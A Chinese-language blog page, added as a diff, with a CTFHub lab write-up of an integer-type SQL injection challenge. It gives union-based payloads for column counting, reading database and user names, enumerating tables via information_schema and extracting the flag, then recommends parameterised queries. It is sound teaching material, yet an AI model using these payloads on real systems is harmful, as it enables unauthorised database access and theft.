@@ -1,0 +1,119 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CTFHub 整数型注入 Writeup - gz2008的技术博客</title>
+    <style>
+        body { background: #f6f9fc; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, "Helvetica Neue", sans-serif; color: #1e293b; line-height: 1.8; padding: 40px 20px; display: flex; justify-content: center; }
+        .container { max-width: 800px; width: 100%; background: #ffffff; border-radius: 20px; box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05); padding: 40px; }
+        .back-link { display: inline-block; margin-bottom: 20px; color: #3b82f6; text-decoration: none; font-weight: 500; }
+        .back-link:hover { text-decoration: underline; }
+        h1 { font-size: 2rem; color: #0f172a; margin-bottom: 10px; border-bottom: 2px solid #eef2f6; padding-bottom: 15px; }
+        .tags { margin-bottom: 25px; }
+        .tag { display: inline-block; background: #eff6ff; color: #2563eb; padding: 4px 12px; border-radius: 20px; font-size: 0.85rem; margin-right: 8px; margin-bottom: 8px; font-weight: 500; }
+        h2 { font-size: 1.4rem; color: #1e293b; margin-top: 30px; margin-bottom: 15px; border-left: 4px solid #3b82f6; padding-left: 10px; }
+        p { margin-bottom: 15px; color: #475569; }
+        ul, ol { margin-left: 20px; margin-bottom: 15px; color: #475569; }
+        li { margin-bottom: 8px; }
+        code { background: #f1f5f9; padding: 2px 6px; border-radius: 4px; font-family: Consolas, monospace; color: #e11d48; font-size: 0.9em; }
+        pre { background: #1e293b; color: #e2e8f0; padding: 15px; border-radius: 8px; overflow-x: auto; font-family: Consolas, monospace; font-size: 0.9em; line-height: 1.6; }
+        .flag-box { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 15px; border-radius: 10px; font-weight: 700; font-size: 1.1rem; text-align: center; font-family: Consolas, monospace; margin: 20px 0; word-break: break-all; }
+        .note { background: #fff7ed; border-left: 4px solid #f97316; padding: 12px 16px; border-radius: 6px; color: #9a3412; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="index.html" class="back-link">← 返回 CTFHub 首页</a>
+
+        <h1>CTFHub - Web - SQL注入 - 整数型注入</h1>
+
+        <div class="tags">
+            <span class="tag"># CTFHub</span>
+            <span class="tag"># Web</span>
+            <span class="tag"># SQL注入</span>
+            <span class="tag"># 整数型</span>
+            <span class="tag"># Union注入</span>
+        </div>
+
+        <h2>一、题目信息</h2>
+        <ul>
+            <li><strong>题目名称：</strong>整数型注入</li>
+            <li><strong>题目方向：</strong>Web - SQL注入</li>
+            <li><strong>题目环境：</strong>动态分配的 HTTP 服务地址</li>
+            <li><strong>题目目标：</strong>通过注入点读取数据库中的 flag。</li>
+        </ul>
+
+        <h2>二、判断注入类型</h2>
+        <p>访问首页后，页面提供 <code>id</code> 查询参数。提交 <code>id=1</code>，服务端直接把执行过的 SQL 语句和查询结果回显到页面中：</p>
+        <pre>select * from news where id=1
+
+ID: 1
+Data: ctfhub</pre>
+        <p>参数没有使用单引号包裹，说明这是一个整数型注入点。继续分别提交真条件和假条件：</p>
+        <pre>select * from news where id=1 and 1=1
+# 返回 ID: 1
+
+select * from news where id=1 and 1=2
+# 没有返回数据</pre>
+        <p>条件为真时正常返回，条件为假时无结果，可以确认 <code>id</code> 参数存在 SQL 注入。</p>
+
+        <h2>三、确定查询列数</h2>
+        <p>原查询使用 <code>select *</code>，需要通过 <code>union select</code> 判断结果集列数。先使用两列：</p>
+        <pre>0 union select 1,2#</pre>
+        <p>页面返回 <code>ID: 1</code> 和 <code>Data: 2</code>，而三列 payload 没有结果，因此原查询共有两列，两个列都可以作为回显位置。</p>
+
+        <h2>四、获取数据库信息</h2>
+        <p>将数据库名和当前用户放入两个回显位置：</p>
+        <pre>0 union select database(),user()#</pre>
+        <p>返回结果：</p>
+        <pre>ID: sqli
+Data: root@localhost</pre>
+        <p>继续读取数据库版本和系统信息：</p>
+        <pre>0 union select version(),@@version_compile_os#</pre>
+        <pre>ID: 10.3.22-MariaDB-0+deb10u1
+Data: debian-linux-gnu</pre>
+
+        <h2>五、枚举表和字段</h2>
+        <p>通过 <code>information_schema.tables</code> 查询当前数据库中的表：</p>
+        <pre>0 union select group_concat(table_name),3
+from information_schema.tables
+where table_schema=database()#</pre>
+        <p>结果中存在：</p>
+        <pre>flag,news</pre>
+        <p>继续查询 <code>flag</code> 表的字段。这里使用十六进制字符串 <code>0x666c6167</code> 表示 <code>flag</code>，可以避免引号规则带来的干扰：</p>
+        <pre>0 union select group_concat(column_name),3
+from information_schema.columns
+where table_schema=database()
+and table_name=0x666c6167#</pre>
+        <p>得到字段名：</p>
+        <pre>flag</pre>
+
+        <h2>六、读取 Flag</h2>
+        <p>将 <code>flag</code> 字段放入第一个回显位置：</p>
+        <pre>0 union select flag,3 from flag#</pre>
+        <p>服务端返回：</p>
+        <pre>select * from news where id=0 union select flag,3 from flag#
+ID: ctfhub{f87b908177ebf13459ac49b1}
+Data: 3</pre>
+        <p>对应的 URL 编码 payload 为：</p>
+        <pre>/?id=0%20union%20select%20flag,3%20from%20flag%23</pre>
+
+        <h2>七、最终 Flag</h2>
+        <div class="flag-box">
+            ctfhub{f87b908177ebf13459ac49b1}
+        </div>
+
+        <h2>八、修复建议</h2>
+        <ul>
+            <li>使用预处理语句和参数绑定，禁止将用户输入直接拼接进 SQL 语句。</li>
+            <li>对 <code>id</code> 等参数执行严格的数据类型校验，只允许合法的整数输入。</li>
+            <li>数据库账号遵循最小权限原则，Web 应用不应使用 <code>root</code> 账号连接数据库。</li>
+            <li>关闭生产环境中的 SQL 语句和详细错误回显，避免泄露数据库结构。</li>
+        </ul>
+
+        <h2>九、解题总结</h2>
+        <p>本题没有复杂的过滤规则，关键是利用页面回显的完整 SQL 语句快速判断整数型注入点，再通过 <code>union select</code> 获取列数、数据库结构并读取 flag。实际开发中应使用参数化查询从根本上消除此类漏洞。</p>
+    </div>
+</body>
+</html>
